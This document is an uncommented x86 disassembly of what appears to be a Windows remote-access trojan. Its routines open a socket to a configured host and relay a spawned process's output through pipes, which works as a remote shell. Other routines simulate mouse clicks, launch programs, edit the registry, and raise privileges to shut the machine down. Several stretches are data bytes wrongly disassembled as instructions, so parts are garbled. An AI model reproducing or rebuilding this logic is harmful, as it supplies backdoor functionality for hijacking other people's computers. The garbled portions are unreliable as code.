mov [ fs : eax ] edx
push sub_488f3f
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_488f80
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48916a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405a44
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x4 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_4055c8
mov eax [ ebp - 0x10 ]
call sub_409edc
mov esi eax
mov eax [ ebp - 0x14 ]
call sub_409edc
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_409edc
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_409edc
imul [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
call sub_409edc
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
mov ebx eax
mov eax [ ebp - 0x10 ]
call sub_409edc
imul [ rw-data ]
push eax
mov eax [ ebp - 0xc ]
call sub_409edc
pop edx
xchg edx eax
mov ecx edx
cdq
idiv ecx
mov esi eax
mov eax [ ebp - 0xc ]
call sub_409edc
cmp eax [ rw-data ]
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x2
call mouse_event
push 0x0
push 0x0
push 0x0
push 0x0
push 0x4
call mouse_event
jmp r-xdata
je r-xdata
push ebx
push esi
call SetCursorPos
sub edi 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489171
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_405554
retn
push 0x0
push 0x0
push 0x0
push 0x0
push 0x8
call mouse_event
push 0x0
push 0x0
push 0x0
push 0x0
push 0x10
call mouse_event
jmp r-xdata
dec edi
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x20
call mouse_event
push 0x0
push 0x0
push 0x0
push 0x0
push 0x40
call mouse_event
jmp r-xdata
sub_48917b
inc [ ecx ]
add [ eax ] al
add [ eax + eax ] bh
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4891b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4891bc
retn
mov eax rw-data
call sub_405530
sub_4891c4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x92
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] ch
xchg edx eax
dec eax
add [ eax + eax ] cl
add al bh
jg r-xdata
add [ eax ] al
adc edx [ ebx + edx * 2 + 0x65 ]
outsb
inc esp
popad
je r-xdata
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add [ edx + edx * 4 + 0x48 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + __dos_stub ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ ebx ] dl
push esp
push ebx
outsb
std
dec [ ebx - 0x4176b ]
dec [ ebp - 0x2417bfbd ]
retn 0xfff7
inc esi
insb
jne r-xdata
push 0x0
push 0x1
push 0x2
call socket
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esp
push 0x64616572
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffbe0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x418 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c07c
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x418 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ ebx + 0x40 ]
call sub_4613d8
mov edx [ ebp - 0x418 ]
lea eax [ ebx + 0x40 ]
call sub_405584
mov edx [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_41c198
push 0x2
push esi
call shutdown
push esi
call closesocket
mov eax [ ebp - 0x4 ]
call sub_404650
push 0x0
call ExitThread
mov [ ebp - 0x414 ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x412 ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov edi eax
mov [ ebp - 0x410 ] edi
inc edi
jne r-xdata
push 0x10
lea eax [ ebp - 0x414 ]
push eax
push esi
call connect
push 0x0
push 0x400
lea eax [ ebp - 0x404 ]
push eax
push esi
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
push r-xdata
push [ ebx + 0x48 ]
push r-xdata
lea edx [ ebp - 0x420 ]
mov eax [ ebx + 0x44 ]
call sub_409d70
push [ ebp - 0x420 ]
lea eax [ ebp - 0x41c ]
mov edx 0x4
call sub_4058e0
mov edx [ ebp - 0x41c ]
mov eax esi
call sub_475ecc
push 0x0
push 0x400
lea eax [ ebp - 0x404 ]
push eax
push esi
call recv
inc eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x410 ] eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_41b734
push 0x0
push ebx
lea eax [ ebp - 0x404 ]
push eax
push esi
call send
inc eax
je r-xdata
push 0x0
push 0x400
lea eax [ ebp - 0x404 ]
push eax
push esi
call recv
inc eax
je r-xdata
test ebx ebx
jg r-xdata
lea eax [ ebp - 0x404 ]
xor ecx ecx
mov edx 0x400
call sub_403af4
lea edx [ ebp - 0x404 ]
mov ecx 0x400
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jle r-xdata
sub_489470
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4894b1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x40 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4894b8
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4894c0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_489501
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x48 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489508
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_489510
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
xchg ebp eax
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x6b ] dh
dec eax
add [ eax ] dl
add [ eax ] al
clc
jg r-xdata
je r-xdata
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add [ eax + 0xe004895 ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
or al 0x54
push edx
insd
outsd
mov [ esi + 0x4 ] eax
push 0x0
push esi
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call CreatePipe
push 0x0
push esi
lea eax [ ebx + 0x40 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call CreatePipe
push 0x104
lea eax [ ebp - 0x178 ]
push eax
push r-xdata
call GetEnvironmentVariableA
lea eax [ ebp - 0x64 ]
xor ecx ecx
mov edx 0x44
call sub_403af4
mov [ ebp - 0x64 ] 0x44
mov [ ebp - 0x38 ] 0x101
mov [ ebp - 0x34 ] 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push 0x0
push 0xffffffff
push esi
push esi
lea eax [ ebp - 0x178 ]
push eax
push 0x0
call CreateProcessA
cmp eax 0x1
sbb eax eax
inc eax
cmp al 0x1
jne r-xdata
push ebx
push 0x906c6c65
push ebp
mov ebp esp
push eax
mov eax 0x4
mov [ ebx + 0x48 ] 0x0
push 0x0
mov eax [ ebp - 0x74 ]
push eax
call TerminateProcess
mov eax [ ebp - 0x74 ]
push eax
call CloseHandle
mov eax [ ebp - 0x70 ]
push eax
call CloseHandle
mov eax esi
call sub_402f1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489855
lea eax [ ebp - 0x499c ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
jmp r-xdata
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffff668
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4998 ] edx
mov [ ebp - 0x499c ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_48984e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebx + 0x48 ] 0x0
mov eax 0xc
call sub_402f00
mov esi eax
mov [ esi ] 0xc
mov [ esi + 0x8 ] 0xffffffff
xor eax eax
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x7d0
call Sleep
jmp r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4994 ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
lea eax [ ebp - 0x4994 ]
push eax
call TranslateMessage
lea eax [ ebp - 0x4994 ]
push eax
call DispatchMessageA
mov [ ebx + 0x48 ] 0x1
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x74 ]
push eax
call GetExitCodeProcess
cmp [ ebp - 0x18 ] 0x103
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405530
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call PeekNamedPipe
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x2400
lea eax [ ebp - 0x2578 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReadFile
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x4978 ]
push eax
lea eax [ ebp - 0x2578 ]
push eax
call __imp_OemToCharA
lea eax [ ebp - 0x4998 ]
push eax
lea eax [ ebp - 0x499c ]
lea edx [ ebp - 0x4978 ]
mov ecx 0x2400
call sub_4057a0
mov eax [ ebp - 0x499c ]
mov ecx [ ebp - 0x14 ]
mov edx 0x1
call sub_405a44
mov edx [ ebp - 0x4998 ]
lea eax [ ebp - 0x4 ]
call sub_405818
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call PeekNamedPipe
cmp [ ebp - 0x14 ] 0x0
ja r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov edi eax
mov [ edi + 0xf ] 0x1
mov dl 0x5
mov eax edi
call sub_41fc40
mov edx [ ebx + 0x44 ]
mov eax edi
call sub_4894c0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_489470
mov edx [ ebx + 0x4c ]
mov eax edi
call sub_4894bc
mov eax edi
call sub_41fef0
mov eax edi
call sub_41ff20
sub_489864
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4898de
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x48 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4898e5
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ esi + 0x40 ]
push eax
call WriteFile
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x2
push r-xdata
mov eax [ esi + 0x40 ]
push eax
call WriteFile
sub ebx 0x4
mov ebx [ ebx ]
sub_4898f8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_489939
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x44 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489940
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48997c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4899fb
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4033b8
lea eax [ ebp - 0x4 ]
call sub_405530
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489a02
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
mov eax 0x22
call sub_4033e0
mov esi eax
inc esi
lea eax [ ebp - 0x8 ]
mov edx r-xdata
movzx edx [ edx + esi - 0x1 ]
call sub_405718
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_405818
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_405584
dec ebx
jne r-xdata
sub_489a38
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_489ae8
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov eax ecx
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x1c ]
push eax
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40ef44
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x20 ]
test ecx ecx
je r-xdata
sub ecx 0x4
mov ecx [ ecx ]
mov eax ecx
cdq
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x14 ]
jne r-xdata
sub ecx 0x4
mov ecx [ ecx ]
je r-xdata
cmp eax [ ebp - 0x18 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489aef
lea eax [ ebp - 0x1c ]
call sub_405530
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
mov bl 0x1
sub_489afc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40a54c
mov edi eax
mov ebx esi
test ebx ebx
je r-xdata
push ebp
mov ecx ebx
sub ecx edi
lea edx [ edi + 0x1 ]
mov eax esi
call sub_405a44
pop ebp
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_489b40
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_489ba4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea edx [ ebp - 0x8 ]
xor eax eax
call sub_40f234
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push 0x0
call MessageBoxA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489bab
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_489bb0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_489c5f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx 0x104
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
call GetTempPathA
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_405584
mov eax esi
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489c66
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_489c78
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_489d27
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx 0x104
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call GetSystemDirectoryA
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_405584
mov eax esi
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489d2e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_489d40
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_489def
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx 0x104
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
call GetWindowsDirectoryA
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_405c6c
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_405a44
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_405584
mov eax esi
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489df6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_489e08
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_489e75
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push r-xdata
push 0x0
call ShellExecuteA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489e7c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_489e9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_489fad
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_489f88
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov [ ebp - 0x4 ] eax
mov edx 0x80000001
mov eax [ ebp - 0x4 ]
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_4218e4
test bl bl
je r-xdata
xor eax eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_409b7c
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_422068
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_405584
xor ecx ecx
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_422008
mov ecx [ rw-data ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_422008
jmp r-xdata
test eax eax
setg al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_489f8f
mov eax [ ebp - 0x4 ]
call sub_404650
push 0x2
push 0x0
push 0x0
push 0x14
call SystemParametersInfoA
retn
test al al
je r-xdata
sub_489ff0
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edx edx
push ebp
push sub_48a028
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
je r-xdata
mov eax r-xdata
call sub_489e08
mov eax r-xdata
call sub_489e08
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_48a070
push ebx
add esp 0xffffffd8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
push ebx
call ExitWindowsEx
cmp eax 0x1
sbb eax eax
inc eax
add esp 0x28
pop ebx
retn
push esp
push 0x28
call GetCurrentProcess
push eax
call OpenProcessToken
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
push r-xdata
push 0x0
call LookupPrivilegeValueA
cmp eax 0x1
sbb eax eax
inc eax
mov [ esp + 0x8 ] 0x1
mov [ esp + 0x14 ] 0x2
mov edx 0x10
xor ecx ecx
mov [ esp + 0x4 ] ecx
test al al
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x1c ]
push eax
push edx
lea eax [ esp + 0x14 ]
push eax
push 0x0
mov eax [ esp + 0x14 ]
push eax
call AdjustTokenPrivileges
sub_48a13c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48a203
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48a1e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_48a1d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
call sub_41bf04
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_404650
retn
call sub_404f70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a20a
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_48a218
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48a2a4
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0x40 ]
xor ecx ecx
mov edx 0x3c
call sub_403af4
mov [ ebp - 0x40 ] 0x3c
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x500
mov eax [ ebp - 0x4 ]
call sub_4059dc
mov [ ebp - 0x30 ] eax
mov eax r-xdata
mov [ ebp - 0x34 ] eax
mov eax r-xdata
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x24 ] 0x1
lea eax [ ebp - 0x40 ]
push eax
call ShellExecuteExA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a2ab
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov bl 0x1
sub_48a2c0
push ebp
mov ebp esp
add esp 0xfffffe28
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x1d8 ] ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_48a3b7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_48a380
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x8 ]
call sub_405530
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x1d4 ]
call sub_403770
lea eax [ ebp - 0x1d4 ]
call sub_40350c
call sub_4033b8
sub ebx 0x2
test ebx ebx
jle r-xdata
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x1d4 ]
call sub_405cd0
call sub_4040ac
lea eax [ ebp - 0x1d4 ]
call sub_403918
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax 0x5f
call sub_4033e0
mov edx eax
add edx 0x20
lea eax [ ebp - 0x1d8 ]
call sub_405718
mov edx [ ebp - 0x1d8 ]
lea eax [ ebp - 0x8 ]
call sub_405818
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48a3be
